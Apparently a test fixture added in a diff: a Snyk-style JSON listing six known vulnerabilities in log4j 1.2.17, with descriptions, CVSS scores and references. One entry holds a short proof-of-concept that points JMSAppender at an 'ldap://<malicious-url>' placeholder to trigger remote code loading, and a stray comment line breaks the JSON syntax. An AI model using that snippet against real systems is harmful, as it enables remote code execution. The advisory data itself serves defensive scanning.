@@ -1,0 +1,548 @@
+{
+    "jsonapi": {
+        "version": "1.0"
+    },
+    "data": [  data[].id/type/attributes[].problems[]*/servities[]*  aggregate over all effective_severity_level
+        {
+            "id": "SNYK-JAVA-LOG4J-2342647",
+            "type": "issue",
+            "attributes": {
+                "key": "SNYK-JAVA-LOG4J-2342647",
+                "title": "Deserialization of Untrusted Data",
+                "type": "package_vulnerability",
+                "created_at": "2022-01-18T17:25:51.891230Z",
+                "updated_at": "2022-08-14T11:49:48.360455Z",
+                "description": "## Overview\n[log4j:log4j](https://github.com/apache/log4j) is a 1.x branch of the Apache Log4j project.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. `JMSSink` in all versions of Log4j 1.x is vulnerable to deserialization of untrusted data when the attacker has write access to the Log4j configuration or if the configuration references an LDAP service the attacker has access to. The attacker can provide a `TopicConnectionFactoryBindingName` configuration causing `JMSSink` to perform `JNDI` requests that result in remote code execution in a similar fashion to [`CVE-2021-4104`](https://security.snyk.io/vuln/SNYK-JAVA-LOG4J-2316893).  \r\n\r\n*Note:* this issue only affects Log4j 1.x when specifically configured to use `JMSSink`, which is not the default.\r\n\r\nApache Log4j 1.2 reached end of life in August 2015. Users should upgrade to Log4j 2 as it addresses numerous other issues from the previous versions.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating object from sequence of bytes is called deserialization. Serialization is commonly used for communication (sharing objects between multiple hosts) and persistence (store the object state in a file or a database). It is an integral part of popular protocols like _Remote Method Invocation (RMI)_, _Java Management Extension (JMX)_, _Java Messaging System (JMS)_, _Action Message Format (AMF)_, _Java Server Faces (JSF) ViewState_, etc.\n\n_Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) is when the application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, thus allowing the attacker to control the state or the flow of the execution.\n  \n## Remediation\nThere is no fixed version for `log4j:log4j`.\n## References\n- [Apache Mailing List](https://lists.apache.org/thread/bsr3l5qz4g0myrjhy9h67bcxodpkwj4w)\n- [Apache Security Advisory](https://logging.apache.org/log4j/1.2/index.html)\n- [Atlassian Patch](https://confluence.atlassian.com/jirakb/list-of-security-vulnerabilities-addressed-in-atlassian-log4j1-1141965553.html)\n- [Reload4j Fix Commit](https://github.com/qos-ch/reload4j/commit/f221f2427c45134cf5768f46279ddf72fe1407c9)\n",
+                "problems": [
+                    {
+                        "id": "CVE-2022-23302",
+                        "source": "CVE"
+                    },
+                    {
+                        "id": "CWE-502",
+                        "source": "CWE"
+                    }
+                ],
+                "coordinates": [
+                    {
+                        "remedies": [
+                            {
+                                "type": "indeterminate",
+                                "description": "Upgrade the package version to  to fix this vulnerability",
+                                "details": {
+                                    "upgrade_package": ""
+                                }
+                            }
+                        ],
+                        "representation": [
+                            "[0,]"
+                        ]
+                    }
+                ],
+                "severities": [
+                    {
+                        "source": "Snyk",
+                        "level": "high",
+                        "score": 8.1,
+                        "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H"
+                    },
+                    {
+                        "source": "NVD",
+                        "level": "high",
+                        "score": 8.8,
+                        "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"
+                    },
+                    {
+                        "source": "SUSE",
+                        "level": "medium",
+                        "score": 6.6,
+                        "vector": "CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:H/I:H/A:H"
+                    },
+                    {
+                        "source": "RHEL",
+                        "level": "high",
+                        "score": 7.5,
+                        "vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H"
+                    }
+                ],
+                "effective_severity_level": "high",
+                "slots": {
+                    "disclosure_time": "2022-01-18T17:22:50Z",
+                    "exploit": "Not Defined",
+                    "publication_time": "2022-01-18T17:28:19Z",
+                    "references": [
+                        {
+                            "url": "https://lists.apache.org/thread/bsr3l5qz4g0myrjhy9h67bcxodpkwj4w",
+                            "title": "Apache Mailing List"
+                        },
+                        {
+                            "url": "https://logging.apache.org/log4j/1.2/index.html",
+                            "title": "Apache Security Advisory"
+                        },
+                        {
+                            "url": "https://confluence.atlassian.com/jirakb/list-of-security-vulnerabilities-addressed-in-atlassian-log4j1-1141965553.html",
+                            "title": "Atlassian Patch"
+                        },
+                        {
+                            "url": "https://github.com/qos-ch/reload4j/commit/f221f2427c45134cf5768f46279ddf72fe1407c9",
+                            "title": "Reload4j Fix Commit"
+                        }
+                    ]
+                }
+            }
+        },
+        {
+            "id": "SNYK-JAVA-LOG4J-2342646",
+            "type": "issue",
+            "attributes": {
+                "key": "SNYK-JAVA-LOG4J-2342646",
+                "title": "Deserialization of Untrusted Data",
+                "type": "package_vulnerability",
+                "created_at": "2022-01-18T17:08:37.955423Z",
+                "updated_at": "2022-08-14T11:49:04.842570Z",
+                "description": "## Overview\n[log4j:log4j](https://github.com/apache/log4j) is a 1.x branch of the Apache Log4j project.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. CVE-2020-9493 identified a deserialization issue that was present in Apache Chainsaw. Prior to Chainsaw V2.0 Chainsaw was a component of Apache Log4j 1.2.x where the same issue exists.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating object from sequence of bytes is called deserialization. Serialization is commonly used for communication (sharing objects between multiple hosts) and persistence (store the object state in a file or a database). It is an integral part of popular protocols like _Remote Method Invocation (RMI)_, _Java Management Extension (JMX)_, _Java Messaging System (JMS)_, _Action Message Format (AMF)_, _Java Server Faces (JSF) ViewState_, etc.\n\n_Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) is when the application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, thus allowing the attacker to control the state or the flow of the execution.\n  \n## Remediation\nThere is no fixed version for `log4j:log4j`.\n## References\n- [Apache Mailing List](https://lists.apache.org/thread/rg4yyc89vs3dw6kpy3r92xop9loywyhh)\n- [Apache Security Advisory](https://logging.apache.org/log4j/1.2/index.html)\n- [Atlassian Patch](https://confluence.atlassian.com/jirakb/list-of-security-vulnerabilities-addressed-in-atlassian-log4j1-1141965553.html)\n- [NVD Information](https://nvd.nist.gov/vuln/detail/CVE-2020-9493)\n- [Reload4j Fix Commit](https://github.com/qos-ch/reload4j/commit/64902fe18ce5a5dd40487051a2f6231d9fbbe9b0)\n",
+                "problems": [
+                    {
+                        "id": "CVE-2022-23307",
+                        "source": "CVE"
+                    },
+                    {
+                        "id": "CWE-502",
+                        "source": "CWE"
+                    }
+                ],
+                "coordinates": [
+                    {
+                        "remedies": [
+                            {
+                                "type": "indeterminate",
+                                "description": "Upgrade the package version to  to fix this vulnerability",
+                                "details": {
+                                    "upgrade_package": ""
+                                }
+                            }
+                        ],
+                        "representation": [
+                            "[0,]"
+                        ]
+                    }
+                ],
+                "severities": [
+                    {
+                        "source": "Snyk",
+                        "level": "high",
+                        "score": 8.1,
+                        "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H"
+                    },
+                    {
+                        "source": "NVD",
+                        "level": "high",
+                        "score": 8.8,
+                        "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"
+                    },
+                    {
+                        "source": "SUSE",
+                        "level": "high",
+                        "score": 8.1,
+                        "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H"
+                    },
+                    {
+                        "source": "RHEL",
+                        "level": "high",
+                        "score": 8.1,
+                        "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H"
+                    }
+                ],
+                "effective_severity_level": "high",
+                "slots": {
+                    "disclosure_time": "2022-01-18T17:06:32Z",
+                    "exploit": "Not Defined",
+                    "publication_time": "2022-01-18T17:13:25Z",
+                    "references": [
+                        {
+                            "url": "https://lists.apache.org/thread/rg4yyc89vs3dw6kpy3r92xop9loywyhh",
+                            "title": "Apache Mailing List"
+                        },
+                        {
+                            "url": "https://logging.apache.org/log4j/1.2/index.html",
+                            "title": "Apache Security Advisory"
+                        },
+                        {
+                            "url": "https://confluence.atlassian.com/jirakb/list-of-security-vulnerabilities-addressed-in-atlassian-log4j1-1141965553.html",
+                            "title": "Atlassian Patch"
+                        },
+                        {
+                            "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-9493",
+                            "title": "NVD Information"
+                        },
+                        {
+                            "url": "https://github.com/qos-ch/reload4j/commit/64902fe18ce5a5dd40487051a2f6231d9fbbe9b0",
+                            "title": "Reload4j Fix Commit"
+                        }
+                    ]
+                }
+            }
+        },
+        {
+            "id": "SNYK-JAVA-LOG4J-2342645",
+            "type": "issue",
+            "attributes": {
+                "key": "SNYK-JAVA-LOG4J-2342645",
+                "title": "SQL Injection",
+                "type": "package_vulnerability",
+                "created_at": "2022-01-18T17:06:29.378900Z",
+                "updated_at": "2022-08-14T11:50:27.813820Z",
+                "description": "## Overview\n[log4j:log4j](https://github.com/apache/log4j) is a 1.x branch of the Apache Log4j project.\n\nAffected versions of this package are vulnerable to SQL Injection. By design, the `JDBCAppender` in Log4j 1.2.x accepts an SQL statement as a configuration parameter where the values to be inserted are converters from `PatternLayout`. The message converter, `%m`, is likely to always be included. This allows attackers to manipulate the SQL by entering crafted strings into input fields or headers of an application that are logged allowing unintended SQL queries to be executed.\r\n\r\n*Note:* this issue only affects Log4j 1.x when specifically configured to use the `JDBCAppender`, which is not the default. \r\n\r\nApache Log4j 1.2 reached end of life in August 2015. Users should upgrade to Log4j 2 as it addresses numerous other issues from the previous versions. Beginning in version 2.0-beta8, the `JDBCAppender` was re-introduced with proper support for parameterized SQL queries and further customization over the columns written to in logs.\n## Remediation\nThere is no fixed version for `log4j:log4j`.\n## References\n- [Apache Mailing List](https://lists.apache.org/thread/pt6lh3pbsvxqlwlp4c5l798dv2hkc85y)\n- [Apache Security Advisory](https://logging.apache.org/log4j/1.2/index.html)\n- [Atlassian Patch](https://confluence.atlassian.com/jirakb/list-of-security-vulnerabilities-addressed-in-atlassian-log4j1-1141965553.html)\n- [Reload4j Fix Commit](https://github.com/qos-ch/reload4j/commit/e845f28e7fb0ecbc0fcce383b11179f2650a51a2)\n",
+                "problems": [
+                    {
+                        "id": "CVE-2022-23305",
+                        "source": "CVE"
+                    },
+                    {
+                        "id": "CWE-89",
+                        "source": "CWE"
+                    }
+                ],
+                "coordinates": [
+                    {
+                        "remedies": [
+                            {
+                                "type": "indeterminate",
+                                "description": "Upgrade the package version to  to fix this vulnerability",
+                                "details": {
+                                    "upgrade_package": ""
+                                }
+                            }
+                        ],
+                        "representation": [
+                            "[0,]"
+                        ]
+                    }
+                ],
+                "severities": [
+                    {
+                        "source": "Snyk",
+                        "level": "high",
+                        "score": 8.1,
+                        "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H"
+                    },
+                    {
+                        "source": "NVD",
+                        "level": "critical",
+                        "score": 9.8,
+                        "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
+                    },
+                    {
+                        "source": "SUSE",
+                        "level": "high",
+                        "score": 8.1,
+                        "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H"
+                    },
+                    {
+                        "source": "RHEL",
+                        "level": "high",
+                        "score": 8.1,
+                        "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H"
+                    }
+                ],
+                "effective_severity_level": "high",
+                "slots": {
+                    "disclosure_time": "2022-01-18T17:01:37Z",
+                    "exploit": "Not Defined",
+                    "publication_time": "2022-01-18T17:13:25Z",
+                    "references": [
+                        {
+                            "url": "https://lists.apache.org/thread/pt6lh3pbsvxqlwlp4c5l798dv2hkc85y",
+                            "title": "Apache Mailing List"
+                        },
+                        {
+                            "url": "https://logging.apache.org/log4j/1.2/index.html",
+                            "title": "Apache Security Advisory"
+                        },
+                        {
+                            "url": "https://confluence.atlassian.com/jirakb/list-of-security-vulnerabilities-addressed-in-atlassian-log4j1-1141965553.html",
+                            "title": "Atlassian Patch"
+                        },
+                        {
+                            "url": "https://github.com/qos-ch/reload4j/commit/e845f28e7fb0ecbc0fcce383b11179f2650a51a2",
+                            "title": "Reload4j Fix Commit"
+                        }
+                    ]
+                }
+            }
+        },
+        {
+            "id": "SNYK-JAVA-LOG4J-2316893",
+            "type": "issue",
+            "attributes": {
+                "key": "SNYK-JAVA-LOG4J-2316893",
+                "title": "Arbitrary Code Execution",
+                "type": "package_vulnerability",
+                "created_at": "2021-12-13T14:52:40.887231Z",
+                "updated_at": "2022-08-14T11:48:20.883806Z",
+                "description": "## Overview\n\n[log4j:log4j](https://github.com/apache/log4j) is a 1.x branch of the Apache Log4j project.\n\n\nAffected versions of this package are vulnerable to Arbitrary Code Execution.\n<br /> **Note:** Even though this vulnerability appears to be related to the [log4j 2.x vulnerability](https://security.snyk.io/vuln/SNYK-JAVA-ORGAPACHELOGGINGLOG4J-2314720), the 1.x branch of the module requires an attacker to have access to modify configurations to be exploitable, which is rarely possible.\r\n\r\nIn order to leverage this vulnerability the following conditions must be met:\r\n\r\n1. The application has enabled `JMSAppender` (or a class that extends `JMSAppender`)\r\n2. The attacker has access to directly modify the `TopicBindingName` or `TopicConnectionFactoryBindingName` configuration variables - which is an unlikely scenario \r\n\r\nIf these conditions are met, log4j 1.x allows a `lookup` feature that does not protect against attacker-controlled LDAP and other JNDI related endpoints. Therefore, an attacker with access to the aforementioned configuration variables is able to execute arbitrary code when loaded from an LDAP server.\r\n\r\n## PoC\r\n\r\n```\r\nimport org.apache.log4j.net.JMSAppender;\r\n// ...\r\nJMSAppender a = new JMSAppender();\r\na.setTopicConnectionFactoryBindingName(\"ldap://<malicious-url>\");\r\n// OR a.setTopicBindingName(\"ldap://<malicious-url>\");\r\na.activateOptions();\r\n```\n\n## Remediation\n\nThere is no fixed version for `log4j:log4j`.\n\n\nlog4j 1.x is End-of-Life, and a fixed version will not be released.\nIf you believe your application meets the conditions mentioned in the advisory, consider upgrading to the latest log4j 2.x version, or block user input from reaching `JMSAppender` configurations.\n\n## References\n\n- [Apache Mail](https://lists.apache.org/thread/0x4zvtq92yggdgvwfgsftqrj4xx5w0nx)\n\n- [Atlassian Patch](https://confluence.atlassian.com/jirakb/list-of-security-vulnerabilities-addressed-in-atlassian-log4j1-1141965553.html)\n\n- [GitHub Comment](https://github.com/apache/logging-log4j2/pull/608#issuecomment-991723301)\n\n- [GitHub Discussion](https://github.com/apache/logging-log4j2/pull/608)\n",
+                "problems": [
+                    {
+                        "id": "CVE-2021-4104",
+                        "source": "CVE"
+                    },
+                    {
+                        "id": "CWE-94",
+                        "source": "CWE"
+                    }
+                ],
+                "coordinates": [
+                    {
+                        "remedies": [
+                            {
+                                "type": "indeterminate",
+                                "description": "Upgrade the package version to  to fix this vulnerability",
+                                "details": {
+                                    "upgrade_package": ""
+                                }
+                            }
+                        ],
+                        "representation": [
+                            "[0,]"
+                        ]
+                    }
+                ],
+                "severities": [
+                    {
+                        "source": "Snyk",
+                        "level": "medium",
+                        "score": 6.6,
+                        "vector": "CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:H/I:H/A:H/E:P"
+                    },
+                    {
+                        "source": "SUSE",
+                        "level": "medium",
+                        "score": 6.4,
+                        "vector": "CVSS:3.1/AV:L/AC:H/PR:H/UI:N/S:U/C:H/I:H/A:H"
+                    },
+                    {
+                        "source": "RHEL",
+                        "level": "high",
+                        "score": 7.5,
+                        "vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H"
+                    },
+                    {
+                        "source": "NVD",
+                        "level": "high",
+                        "score": 7.5,
+                        "vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H"
+                    }
+                ],
+                "effective_severity_level": "medium",
+                "slots": {
+                    "disclosure_time": "2021-12-10T00:00:00Z",
+                    "exploit": "Proof of Concept",
+                    "publication_time": "2021-12-13T15:31:00Z",
+                    "references": [
+                        {
+                            "url": "https://lists.apache.org/thread/0x4zvtq92yggdgvwfgsftqrj4xx5w0nx",
+                            "title": "Apache Mail"
+                        },
+                        {
+                            "url": "https://confluence.atlassian.com/jirakb/list-of-security-vulnerabilities-addressed-in-atlassian-log4j1-1141965553.html",
+                            "title": "Atlassian Patch"
+                        },
+                        {
+                            "url": "https://github.com/apache/logging-log4j2/pull/608%23issuecomment-991723301",
+                            "title": "GitHub Comment"
+                        },
+                        {
+                            "url": "https://github.com/apache/logging-log4j2/pull/608",
+                            "title": "GitHub Discussion"
+                        }
+                    ]
+                }
+            }
+        },
+        {
+            "id": "SNYK-JAVA-LOG4J-572732",
+            "type": "issue",
+            "attributes": {
+                "key": "SNYK-JAVA-LOG4J-572732",
+                "title": "Deserialization of Untrusted Data",
+                "type": "package_vulnerability",
+                "created_at": "2020-06-18T15:47:31.144561Z",
+                "updated_at": "2022-08-14T11:47:12.264715Z",
+                "description": "## Overview\n[log4j:log4j](https://github.com/apache/log4j) is a 1.x branch of the Apache Log4j project.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. Included in Log4j 1.2 is a SocketServer class that is vulnerable to deserialization of untrusted data which can be exploited to remotely execute arbitrary code when combined with a deserialization gadget when listening to untrusted network traffic for log data.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating object from sequence of bytes is called deserialization. Serialization is commonly used for communication (sharing objects between multiple hosts) and persistence (store the object state in a file or a database). It is an integral part of popular protocols like _Remote Method Invocation (RMI)_, _Java Management Extension (JMX)_, _Java Messaging System (JMS)_, _Action Message Format (AMF)_, _Java Server Faces (JSF) ViewState_, etc.\n\n_Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)), is when the application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, letting the attacker to control the state or the flow of the execution.\n\nJava deserialization issues have been known for years. However, interest in the issue intensified greatly in 2015, when classes that could be abused to achieve remote code execution were found in a [popular library (Apache Commons Collection)](https://snyk.io/vuln/SNYK-JAVA-COMMONSCOLLECTIONS-30078). These classes were used in zero-days affecting IBM WebSphere, Oracle WebLogic and many other products.\n\n  \nAn attacker just needs to identify a piece of software that has both a vulnerable class on its path, and performs deserialization on untrusted data. Then all they need to do is send the payload into the deserializer, getting the command executed.\n  \n\n> Developers put too much trust in Java Object Serialization. Some even de-serialize objects pre-authentication. When deserializing an Object in Java you typically cast it to an expected type, and therefore Java's strict type system will ensure you only get valid object trees. Unfortunately, by the time the type checking happens, platform code has already created and executed significant logic. So, before the final type is checked a lot of code is executed from the readObject() methods of various objects, all of which is out of the developer's control. By combining the readObject() methods of various classes which are available on the classpath of the vulnerable application an attacker can execute functions (including calling Runtime.exec() to execute local OS commands).\n\n- Apache Blog\n  \n## Remediation\nThere is no fixed version for `log4j:log4j`.\n## References\n- [Apache Security Advisory](https://lists.apache.org/thread.html/eea03d504b36e8f870e8321d908e1def1addda16adda04327fe7c125%40%3Cdev.logging.apache.org%3E)\n- [Atlassian Patch](https://confluence.atlassian.com/jirakb/list-of-security-vulnerabilities-addressed-in-atlassian-log4j1-1141965553.html)\n- [PoC](https://0xsapra.github.io/website/CVE-2019-17571)\n",
+                "problems": [
+                    {
+                        "id": "CVE-2019-17571",
+                        "source": "CVE"
+                    },
+                    {
+                        "id": "CWE-502",
+                        "source": "CWE"
+                    },
+                    {
+                        "id": "GHSA-2qrg-x229-3v8q",
+                        "source": "GHSA"
+                    }
+                ],
+                "coordinates": [
+                    {
+                        "remedies": [
+                            {
+                                "type": "indeterminate",
+                                "description": "Upgrade the package version to  to fix this vulnerability",
+                                "details": {
+                                    "upgrade_package": ""
+                                }
+                            }
+                        ],
+                        "representation": [
+                            "[0,]"
+                        ]
+                    }
+                ],
+                "severities": [
+                    {
+                        "source": "Snyk",
+                        "level": "critical",
+                        "score": 9.8,
+                        "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P"
+                    },
+                    {
+                        "source": "NVD",
+                        "level": "critical",
+                        "score": 9.8,
+                        "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
+                    },
+                    {
+                        "source": "RHEL",
+                        "level": "critical",
+                        "score": 9.8,
+                        "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
+                    },
+                    {
+                        "source": "SUSE",
+                        "level": "critical",
+                        "score": 9.8,
+                        "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
+                    }
+                ],
+                "effective_severity_level": "critical",
+                "slots": {
+                    "disclosure_time": "2019-12-22T09:33:11Z",
+                    "exploit": "Proof of Concept",
+                    "publication_time": "2020-06-19T09:33:01Z",
+                    "references": [
+                        {
+                            "url": "https://lists.apache.org/thread.html/eea03d504b36e8f870e8321d908e1def1addda16adda04327fe7c125%40%3Cdev.logging.apache.org%3E",
+                            "title": "Apache Security Advisory"
+                        },
+                        {
+                            "url": "https://confluence.atlassian.com/jirakb/list-of-security-vulnerabilities-addressed-in-atlassian-log4j1-1141965553.html",
+                            "title": "Atlassian Patch"
+                        },
+                        {
+                            "url": "https://0xsapra.github.io/website/CVE-2019-17571",
+                            "title": "PoC"
+                        }
+                    ]
+                }
+            }
+        },
+        {
+            "id": "SNYK-JAVA-LOG4J-1300176",
+            "type": "issue",
+            "attributes": {
+                "key": "SNYK-JAVA-LOG4J-1300176",
+                "title": "Man-in-the-Middle (MitM)",
+                "type": "package_vulnerability",
+                "created_at": "2021-06-04T15:38:41.700520Z",
+                "updated_at": "2022-08-14T11:46:01.799264Z",
+                "description": "## Overview\n[log4j:log4j](https://github.com/apache/log4j) is a 1.x branch of the Apache Log4j project.\n\nAffected versions of this package are vulnerable to Man-in-the-Middle (MitM). Improper validation of certificate with host mismatch in Apache Log4j SMTP appender. This could allow an SMTPS connection to be intercepted by a man-in-the-middle attack which could leak any log messages sent through that appender.\n## Remediation\nThere is no fixed version for `log4j:log4j`.\n## References\n- [Atlassian Patch](https://confluence.atlassian.com/jirakb/list-of-security-vulnerabilities-addressed-in-atlassian-log4j1-1141965553.html)\n- [GitHub Commit](https://github.com/apache/logging-log4j2/commit/6851b5083ef9610bae320bf07e1f24d2aa08851b)\n- [Jira Issue](https://issues.apache.org/jira/browse/LOG4J2-2819)\n- [Reload4j Fix Commit](https://github.com/qos-ch/reload4j/commit/90bc7826c206c256ee9ec6b51318cc1865cc19e9)\n",
+                "problems": [
+                    {
+                        "id": "CVE-2020-9488",
+                        "source": "CVE"
+                    },
+                    {
+                        "id": "CWE-297",
+                        "source": "CWE"
+                    },
+                    {
+                        "id": "GHSA-vwqq-5vrc-xw9h",
+                        "source": "GHSA"
+                    }
+                ],
+                "coordinates": [
+                    {
+                        "remedies": [
+                            {
+                                "type": "indeterminate",
+                                "description": "Upgrade the package version to  to fix this vulnerability",
+                                "details": {
+                                    "upgrade_package": ""
+                                }
+                            }
+                        ],
+                        "representation": [
+                            "[0,]"
+                        ]
+                    }
+                ],
+                "severities": [
+                    {
+                        "source": "Snyk",
+                        "level": "low",
+                        "score": 3.7,
+                        "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N"
+                    },
+                    {
+                        "source": "RHEL",
+                        "level": "low",
+                        "score": 3.7,
+                        "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N"
+                    },
+                    {
+                        "source": "NVD",
+                        "level": "low",
+                        "score": 3.7,
+                        "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N"
+                    }
+                ],
+                "effective_severity_level": "low",
+                "slots": {
+                    "disclosure_time": "2020-04-27T17:16:14Z",
+                    "exploit": "Not Defined",
+                    "publication_time": "2020-04-28T17:16:14Z",
+                    "references": [
+                        {
+                            "url": "https://confluence.atlassian.com/jirakb/list-of-security-vulnerabilities-addressed-in-atlassian-log4j1-1141965553.html",
+                            "title": "Atlassian Patch"
+                        },
+                        {
+                            "url": "https://github.com/apache/logging-log4j2/commit/6851b5083ef9610bae320bf07e1f24d2aa08851b",
+                            "title": "GitHub Commit"
+                        },
+                        {
+                            "url": "https://issues.apache.org/jira/browse/LOG4J2-2819",
+                            "title": "Jira Issue"
+                        },
+                        {
+                            "url": "https://github.com/qos-ch/reload4j/commit/90bc7826c206c256ee9ec6b51318cc1865cc19e9",
+                            "title": "Reload4j Fix Commit"
+                        }
+                    ]
+                }
+            }
+        }
+    ],
+    "links": {
+        "self": "/orgs/b33bc7ce-41b5-4ff1-9a92-31789ba5abe9/packages/pkg%3Amaven%2flog4j%2flog4j%401.2.17/issues?version=2022-09-15&limit=1000&offset=0"
+    },
+    "meta": {
+        "package": {
+            "name": "log4j",
+            "type": "maven",
+            "url": "pkg:maven/log4j/log4j@1.2.17",
+            "version": "1.2.17"
+        }
+    }
+}
